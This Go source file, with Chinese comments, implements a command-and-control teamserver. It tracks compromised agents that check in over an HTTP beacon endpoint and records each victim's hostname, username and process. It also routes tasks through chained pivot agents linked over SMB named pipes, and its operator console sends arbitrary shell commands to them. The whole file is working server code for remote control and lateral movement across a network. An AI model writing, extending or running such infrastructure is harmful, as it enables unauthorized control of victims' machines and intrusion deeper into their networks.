package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"server/safe"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- 协议常量 ---
const (
	CMD_EXEC     = 0x01
	CMD_SMB      = 0x02
	CMD_FORWARD  = 0x03
	CMD_REGISTER = 0x04
	CMD_ACK      = 0x05
)

// --- Metadata 结构 ---
type AgentMetadata struct {
	AgentID  uint32 `json:"agent_id"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	Process  string `json:"process"`
	PID      int    `json:"pid"`
}

type AgentInfo struct {
	Metadata AgentMetadata
	Active   bool
	LastSeen time.Time
}

type Pivots struct {
	Parent *Agent
	Links  []*Agent
}

type Agent struct {
	AgentID   uint32
	RouteID   uint32
	Info      *AgentInfo
	Pivots    Pivots
	TaskQueue *safe.Queue
}

type Teamserver struct {
	Agents map[uint32]*Agent
	mu     sync.RWMutex
}

var ts = &Teamserver{
	Agents: make(map[uint32]*Agent),
}

// --- 协议工具 ---
func makePacket(cmdType byte, payload []byte) []byte {
	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmdType
	copy(buf[5:], payload)
	return buf
}

func uint32ToBytes(n uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, n)
	return b
}

// --- Agent 管理 ---
func (ts *Teamserver) RegisterAgent(metadata *AgentMetadata) (*Agent, bool) {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	agentID := metadata.AgentID
	var agent *Agent
	isNew := false

	if existing, ok := ts.Agents[agentID]; ok {
		existing.Info.LastSeen = time.Now()
		existing.Info.Active = true
		agent = existing
	} else {
		agent = &Agent{
			AgentID: agentID,
			RouteID: 0,
			Info: &AgentInfo{
				Metadata: *metadata,
				Active:   true,
				LastSeen: time.Now(),
			},
			Pivots:    Pivots{Parent: nil, Links: make([]*Agent, 0)},
			TaskQueue: safe.NewSafeQueue(0x100),
		}
		ts.Agents[agentID] = agent
		isNew = true
		fmt.Printf("\n[+] Gateway Online  | ID: %d | %s@%s\n> ", agentID, metadata.Username, metadata.Hostname)
	}
	return agent, isNew
}

func (ts *Teamserver) RegisterPivot(parentID uint32, routeID uint32, metadata *AgentMetadata) (*Agent, error) {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	parent, ok := ts.Agents[parentID]
	if !ok {
		return nil, fmt.Errorf("parent %d not found", parentID)
	}

	agentID := metadata.AgentID
	if existing, ok := ts.Agents[agentID]; ok {
		existing.Info.Active = true
		existing.Info.LastSeen = time.Now()
		return existing, nil
	}

	fmt.Printf("agentid:%d\n", agentID)
	agent := &Agent{
		AgentID: agentID,
		RouteID: routeID,
		Info: &AgentInfo{
			Metadata: *metadata,
			Active:   true,
			LastSeen: time.Now(),
		},
		Pivots:    Pivots{Parent: parent, Links: make([]*Agent, 0)},
		TaskQueue: safe.NewSafeQueue(0x100),
	}

	parent.Pivots.Links = append(parent.Pivots.Links, agent)
	ts.Agents[agentID] = agent

	fmt.Printf("\n[+] Pivot Online    | ID: %d | Parent: %d | %s@%s\n> ",
		agentID, parentID, metadata.Username, metadata.Hostname)
	return agent, nil
}

func (ts *Teamserver) SendCommand(targetID uint32, cmdType byte, payload []byte) error {
	ts.mu.RLock()
	target, ok := ts.Agents[targetID]
	ts.mu.RUnlock()

	if !ok {
		return fmt.Errorf("agent %d not found", targetID)
	}

	packet := makePacket(cmdType, payload)

	// 计算路径：Target -> Parent -> ... -> Gateway
	path := []*Agent{}
	curr := target
	for curr != nil {
		path = append(path, curr)
		curr = curr.Pivots.Parent
	}

	// 封装 FORWARD 包
	for i := 1; i < len(path); i++ {
		nextHop := path[i-1] // 下一跳是子节点
		fwdPayload := make([]byte, 4+len(packet))
		binary.BigEndian.PutUint32(fwdPayload[0:4], nextHop.RouteID)
		copy(fwdPayload[4:], packet)
		packet = makePacket(CMD_FORWARD, fwdPayload)
	}

	gateway := path[len(path)-1]

	gateway.TaskQueue.Push(packet)
	return nil
}

// --- HTTP Handler ---
func (ts *Teamserver) httpHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		return
	}

	// 读取所有上报数据
	body, _ := ioutil.ReadAll(r.Body)
	reader := bytes.NewReader(body)

	// Gateway ID（直连的Agent）
	gwIDStr := r.Header.Get("X-Agent-ID")
	gwID64, _ := strconv.ParseUint(gwIDStr, 10, 32)
	gwID := uint32(gwID64)

	// 解析包列表
	for reader.Len() > 0 {
		header := make([]byte, 4)
		if _, err := reader.Read(header); err != nil {
			break
		}
		length := binary.BigEndian.Uint32(header)
		packetBody := make([]byte, length)
		if _, err := reader.Read(packetBody); err != nil {
			break
		}

		ts.processMessage(gwID, packetBody[0], packetBody[1:])
	}

	// ========== 修改部分：找到Gateway并获取任务 ==========

	// 1. 获取当前Agent
	ts.mu.RLock()
	agent, ok := ts.Agents[gwID]
	if !ok {
		ts.mu.RUnlock()
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// 2. 向上追溯到Gateway（根节点）
	gateway := agent
	for gateway.Pivots.Parent != nil {
		gateway = gateway.Pivots.Parent
	}
	ts.mu.RUnlock()

	// 3. 从Gateway的任务队列获取任务
	taskdata, err := gateway.TaskQueue.Pop()
	if err != nil {
		// 队列为空，返回204 No Content
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// 4. 返回任务数据
	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	data := taskdata.([]byte)
	w.Write(data)
}

func (ts *Teamserver) processMessage(fromID uint32, cmdType byte, data []byte) {
	ts.mu.RLock()
	if ag, ok := ts.Agents[fromID]; ok {
		ag.Info.LastSeen = time.Now()
	}
	ts.mu.RUnlock()

	switch cmdType {
	case CMD_EXEC:
		fmt.Printf("\n[Agent %d] Result:\n%s\n> ", fromID, string(data))
	case CMD_REGISTER:
		// Gateway 注册
		var meta AgentMetadata
		json.Unmarshal(data, &meta)
		ag, isNew := ts.RegisterAgent(&meta)
		if isNew {
			ts.SendCommand(ag.AgentID, CMD_ACK, uint32ToBytes(ag.AgentID))
		}
	case CMD_FORWARD:
		if len(data) < 4 {
			return
		}
		routeID := binary.BigEndian.Uint32(data[0:4])
		innerData := data[4:] // [Len][Type][Body]

		// 解析内部包
		if len(innerData) < 5 {
			return
		}
		innerLen := binary.BigEndian.Uint32(innerData[0:4])
		innerType := innerData[4]
		innerBody := innerData[5 : 5+innerLen-1]

		if innerType == CMD_REGISTER {
			// Pivot 注册
			var meta AgentMetadata
			json.Unmarshal(innerBody, &meta)
			newAg, _ := ts.RegisterPivot(fromID, routeID, &meta)
			if newAg != nil {
				ts.SendCommand(newAg.AgentID, CMD_ACK, uint32ToBytes(newAg.AgentID))
			}
			return
		}

		// 递归转发
		ts.mu.RLock()
		parent := ts.Agents[fromID]
		var actualSrc uint32
		if parent != nil {
			for _, link := range parent.Pivots.Links {
				if link.RouteID == routeID {
					actualSrc = link.AgentID
					break
				}
			}
		}
		ts.mu.RUnlock()

		if actualSrc != 0 {
			ts.processMessage(actualSrc, innerType, innerBody)
		}
	}
}

func runCLI() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("> ")
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		parts := strings.Fields(line)
		if len(parts) == 0 {
			fmt.Print("> ")
			continue
		}

		switch parts[0] {
		case "list":
			ts.mu.RLock()
			for _, ag := range ts.Agents {
				if ag.Pivots.Parent == nil {
					printTree(ag, 0)
				}
			}
			ts.mu.RUnlock()
		case "exec":
			if len(parts) < 3 {
				break
			}
			id, _ := strconv.Atoi(parts[1])
			ts.SendCommand(uint32(id), CMD_EXEC, []byte(strings.Join(parts[2:], " ")))
		case "link":
			if len(parts) < 3 {
				fmt.Println("Usage: link <agent_id> <pipe_path>")
				break
			}
			id, _ := strconv.Atoi(parts[1])
			ts.SendCommand(uint32(id), CMD_SMB, []byte(parts[2]))
		}
		fmt.Print("> ")
	}
}

func printTree(agent *Agent, depth int) {
	fmt.Printf("%s|-- [%d] %s@%s\n", strings.Repeat("  ", depth), agent.AgentID, agent.Info.Metadata.Username, agent.Info.Metadata.Hostname)
	for _, child := range agent.Pivots.Links {
		printTree(child, depth+1)
	}
}

func main() {
	http.HandleFunc("/api/beat", ts.httpHandler)
	go http.ListenAndServe(":8080", nil)
	fmt.Println("[*] Server listening on :8080")
	runCLI()
}
